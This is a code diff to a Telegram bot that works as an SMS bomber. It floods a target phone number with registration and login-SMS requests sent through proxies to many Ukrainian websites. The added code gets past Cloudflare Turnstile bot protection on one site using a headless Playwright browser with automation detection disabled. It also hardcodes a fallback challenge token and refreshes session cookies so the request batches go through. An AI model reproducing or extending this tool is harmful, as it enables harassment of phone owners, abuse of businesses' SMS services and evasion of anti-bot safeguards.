@@ -2,6 +2,12 @@ from aiogram import *
 import fake_useragent
 import asyncio
 import logging
+try:
+    from playwright.async_api import async_playwright
+    PLAYWRIGHT_AVAILABLE = True
+except ImportError:
+    PLAYWRIGHT_AVAILABLE = False
+    logging.warning("Playwright не встановлено. Автоматичне отримання cf-turnstile-response токену буде недоступне.")
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.dispatcher import FSMContext
 from aiogram.types import Message
@@ -214,6 +220,126 @@ async def email():
     generated_email = f"{name}@gmail.com"
     logging.info(f"email: {generated_email}")
     return generated_email
+
+async def get_turnstile_token(proxy_url=None, proxy_auth=None):
+    """
+    Отримує токен Cloudflare Turnstile через автоматизований браузер Playwright
+    """
+    if not PLAYWRIGHT_AVAILABLE:
+        logging.warning("Playwright не встановлено. Використовується статичний токен.")
+        return None
+    
+    try:
+        async with async_playwright() as p:
+            # Налаштування браузера
+            browser_options = {
+                "headless": True,
+                "args": ["--disable-blink-features=AutomationControlled"]
+            }
+            
+            # Додаємо проксі якщо є
+            if proxy_url:
+                # Конвертуємо проксі формат для Playwright
+                # Формат: http://user:pass@host:port
+                proxy_config = {"server": proxy_url}
+                browser_options["proxy"] = proxy_config
+            
+            browser = await p.chromium.launch(**browser_options)
+            
+            # Створюємо контекст з cookies
+            context = await browser.new_context(
+                viewport={"width": 1920, "height": 1080},
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            )
+            
+            # Додаємо cookies
+            for key, value in cookies_smaki.items():
+                await context.add_cookies([{
+                    "name": key,
+                    "value": value,
+                    "domain": "smaki-maki.com",
+                    "path": "/"
+                }])
+            
+            page = await context.new_page()
+            
+            # Відкриваємо сторінку
+            await page.goto("https://smaki-maki.com/", wait_until="networkidle", timeout=30000)
+            
+            # Чекаємо поки Turnstile завантажиться та отримає токен
+            try:
+                # Шукаємо елемент Turnstile
+                await page.wait_for_selector('iframe[src*="challenges.cloudflare.com"]', timeout=10000)
+                logging.info("Знайдено iframe Cloudflare Turnstile")
+                
+                # Чекаємо поки токен з'явиться (Turnstile автоматично проходить перевірку)
+                await page.wait_for_timeout(5000)  # Чекаємо 5 секунд на проходження перевірки
+                
+                # Отримуємо токен з JavaScript
+                token = await page.evaluate("""
+                    () => {
+                        // Шукаємо всі iframe з Turnstile
+                        const iframes = document.querySelectorAll('iframe[src*="challenges.cloudflare.com"]');
+                        for (let iframe of iframes) {
+                            try {
+                                // Намагаємося отримати токен з callback
+                                const token = iframe.contentWindow?.turnstile?.getResponse();
+                                if (token) return token;
+                            } catch (e) {}
+                        }
+                        
+                        // Або шукаємо в формі
+                        const form = document.querySelector('form');
+                        if (form) {
+                            const input = form.querySelector('input[name="cf-turnstile-response"]');
+                            if (input && input.value) return input.value;
+                        }
+                        
+                        // Або шукаємо в глобальній змінній
+                        if (window.turnstileResponse) return window.turnstileResponse;
+                        
+                        return null;
+                    }
+                """)
+                
+                if token:
+                    logging.info(f"Отримано Turnstile токен: {token[:50]}...")
+                    await browser.close()
+                    return token
+                else:
+                    logging.warning("Токен Turnstile не знайдено на сторінці")
+                    
+                    # Спробуємо клікнути на форму щоб активувати Turnstile
+                    try:
+                        form = await page.query_selector('form')
+                        if form:
+                            await form.evaluate("form => form.dispatchEvent(new Event('submit'))")
+                            await page.wait_for_timeout(3000)
+                            
+                            # Знову шукаємо токен
+                            token = await page.evaluate("""
+                                () => {
+                                    const input = document.querySelector('input[name="cf-turnstile-response"]');
+                                    return input ? input.value : null;
+                                }
+                            """)
+                            
+                            if token:
+                                logging.info(f"Отримано Turnstile токен після активації: {token[:50]}...")
+                                await browser.close()
+                                return token
+                    except Exception as e:
+                        logging.error(f"Помилка активації Turnstile: {e}")
+                    
+            except Exception as e:
+                logging.error(f"Помилка очікування Turnstile: {e}")
+            
+            await browser.close()
+            return None
+            
+    except Exception as e:
+        logging.error(f"Помилка отримання Turnstile токену через Playwright: {e}")
+        return None
 
 async def get_csrf_token(url, headers=None):
     async with aiohttp.ClientSession() as session:
@@ -1416,6 +1542,15 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
     ]
     
+    # Отримуємо Cloudflare Turnstile токен для smaki-maki
+    logging.info("Спроба отримати Turnstile токен автоматично...")
+    cf_turnstile_token = await get_turnstile_token(proxy_url=proxy_url, proxy_auth=proxy_auth)
+    
+    # Якщо автоматичне отримання не вдалося, використовуємо статичний токен як fallback
+    if not cf_turnstile_token:
+        logging.warning("Автоматичне отримання токену не вдалося, використовується статичний токен")
+        cf_turnstile_token = "0.xm5dnZ1yqhSNP_6pLtyn11ImtH8O5GwAC9-7UFirY-YXuXmkQJqZtnSBddBIR9WIgVMNNronsaOLiGgt1cZKrkr1ultCgFvvY-_kJ_L4-LX0s5YQSY5IJKYxQ5PqZYvjNqWuETy-Ll-izf4N8yADWbIfyfQiJkw3H2hMZS9tKX65uiNuU3Z_48JAOJMyToYD2CPnGm6-aYtM_tH8KBq4UNE96YULm5uqiZekyc5AWUHSelKFWick824JhQ8ijeboKSWrg8qgA5Wb1x-C6Ut0Psdg1ZwtOw5oE2FzkAF90BhEvXKgm1txa9iXUbECf4r1vsyhGu7536bLcGRm3_zmd2Oqq4SlbRzLyPxEwE3oxKvGGiWlv5sAr2hVeGz2rFygySqwCVkETo2Eh7gjtq8I_btGLNX-mJm3MqMLwqGjLJZi9J3DH0QTGP-LBTxV044PUj3yNGHt5UPmm-fjbVMhPUH1ueTDMrSU3Ili2n290LvABS3O7M5CUaxmFXkLTP7QlvCfVUYtxzXCPS1E-_3xRM58wpkRDBAAKUGqv000kPTfUbdLlLmOIYU_ma0dKDW4k7K0LAT9LYgmlKKiHQ_Ab040gniS5Ycgr8bRbZlOasnBtc1HGNb0BshMW7cL5WeuvJTRIiCgLyt4HCRn2zaSWJE4wBNTd8L-_pxeprXNKXggPPDO9srZ6VD9Simc3fEIRTWfTVbY9v4Jwlw6XdTKdRX9mLw_MKbDDOIZG4ty7pn15SXaGWfvcXziDNoaxZdlWsGH4k7cgfjDxMykb-sk1uo-kBU8LaWN11tyyXbwFvMWsjbiVid5RZSRgXgpnatm5YnzZ8hScpW4CtZX8AluQrZrnTVPXzeAEz_vUgXZUgPHRW0Cy-xikDmhCyD0CpyF.RUn_YLMaZW7AtthUofAmYA.8b55bca70f8975270a359d382c6a6129948f0955f302c6dc54b28a58b6363d44"
+    
     # Додаємо smaki-maki: перший запит в початок, другий в кінець
     smaki_first = None
     smaki_second = None
@@ -1424,23 +1559,53 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         random_name_length = random.randint(5, 10)
         random_name = ''.join(random.choices(string.ascii_letters, k=random_name_length))
         logging.info(f"Додаю перший запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name}")
-        smaki_first = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
+        smaki_first = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": cf_turnstile_token}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
         
         # Генеруємо випадкове ім'я для другого запиту
         random_name_length2 = random.randint(5, 10)
         random_name2 = ''.join(random.choices(string.ascii_letters, k=random_name_length2))
         logging.info(f"Додаю другий запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name2}")
-        smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
+        smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": cf_turnstile_token}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
     else:
         logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
     
     # Формуємо першу пачку (всі перші запити)
-    first_batch = first_requests.copy()
+    first_batch = list(first_requests)  # Копіюємо список
     if smaki_first:
         first_batch.insert(0, smaki_first)
     
-    # Формуємо другу пачку (всі другі запити)
-    second_batch = second_requests.copy()
+    # Формуємо другу пачку (всі другі запити) - оновлюємо OCSESSID перед другою пачкою
+    second_batch = list(second_requests)  # Копіюємо список
+    
+    # Оновлюємо OCSESSID для другого запиту smaki-maki перед другою пачкою
+    if smaki_second and smaki_session_id:
+        # Отримуємо новий OCSESSID для другого запиту
+        try:
+            timeout = aiohttp.ClientTimeout(total=5)
+            async with aiohttp.ClientSession(timeout=timeout, cookies=cookies_smaki) as session:
+                async with session.get("https://smaki-maki.com/", headers=headers_smaki, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
+                    if resp.status == 200:
+                        cookies_from_resp = resp.cookies
+                        if 'OCSESSID' in cookies_from_resp:
+                            new_smaki_session_id = cookies_from_resp['OCSESSID'].value
+                            logging.info(f"Оновлено OCSESSID для другого запиту smaki-maki: {new_smaki_session_id[:10]}...")
+                            # Оновлюємо cookies у другому запиті
+                            new_smaki_cookies = smaki_cookies_final.copy()
+                            new_smaki_cookies['OCSESSID'] = new_smaki_session_id
+                            # Оновлюємо другий запит з новими cookies та токеном
+                            # Отримуємо новий токен для другого запиту
+                            logging.info("Отримую новий Turnstile токен для другого запиту...")
+                            new_cf_turnstile_token = await get_turnstile_token(proxy_url=proxy_url, proxy_auth=proxy_auth)
+                            if not new_cf_turnstile_token:
+                                new_cf_turnstile_token = cf_turnstile_token  # Використовуємо старий якщо новий не отримано
+                            
+                            # Перестворюємо smaki_second з новими cookies та токеном
+                            random_name_length2 = random.randint(5, 10)
+                            random_name2 = ''.join(random.choices(string.ascii_letters, k=random_name_length2))
+                            smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": new_cf_turnstile_token}, "headers": headers_smaki, "cookies": new_smaki_cookies}))
+        except Exception as e:
+            logging.error(f"Помилка оновлення OCSESSID для другого запиту: {e}")
+    
     if smaki_second:
         second_batch.append(smaki_second)
 
@@ -1452,6 +1617,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         logging.info(f"Запускаю першу пачку ({len(first_batch)} запитів)")
         await asyncio.gather(*first_batch, return_exceptions=True)
         logging.info("Перша пачка завершена")
+    else:
+        logging.warning("Перша пачка порожня!")
     
     # Чекаємо 10 секунд перед другою пачкою
     if second_batch:
@@ -1463,6 +1630,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         logging.info(f"Запускаю другу пачку ({len(second_batch)} запитів)")
         await asyncio.gather(*second_batch, return_exceptions=True)
         logging.info("Друга пачка завершена")
+    else:
+        logging.warning("Друга пачка порожня!")
 
 async def start_attack(number, chat_id):
     global attack_flags
@@ -1510,7 +1679,12 @@ async def start_attack(number, chat_id):
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
+                try:
+                    msg_id = last_status_msg.get(chat_id)
+                    if msg_id:
+                        await bot.edit_message_text("🛑 Атака зупинена користувачем.", chat_id=chat_id, message_id=msg_id)
+                except Exception:
+                    pass
                 return
             await asyncio.sleep(1.0)  # Затримка 1 секунда між циклами
             
